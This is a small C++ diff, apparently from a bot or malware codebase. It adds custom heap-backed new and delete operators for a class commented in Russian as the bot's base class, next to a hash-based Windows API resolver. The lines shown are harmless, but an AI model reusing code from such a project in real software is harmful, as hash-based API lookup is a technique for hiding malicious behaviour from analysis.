@@ -507,4 +507,30 @@ LPVOID GetProcAddressEx(PCHAR Dll, DWORD dwModule, DWORD dwProcNameHash )
 		return (LPVOID)0x00000000;
 
 	return ret;
-} 
+}
+
+
+//****************************************************************
+//  TBotClass - базовый класс бота
+//****************************************************************
+
+void* TBotClass::operator new(size_t size)
+{
+	return HEAP::Alloc(size);
+}
+
+void* TBotClass::operator new[](size_t size)
+{
+	return HEAP::Alloc(size);
+}
+
+void  TBotClass::operator delete(void* Pointer)
+{
+	HEAP::Free(Pointer);
+}
+
+void  TBotClass::operator delete[](void* Pointer)
+{
+	HEAP::Free(Pointer);
+}
+
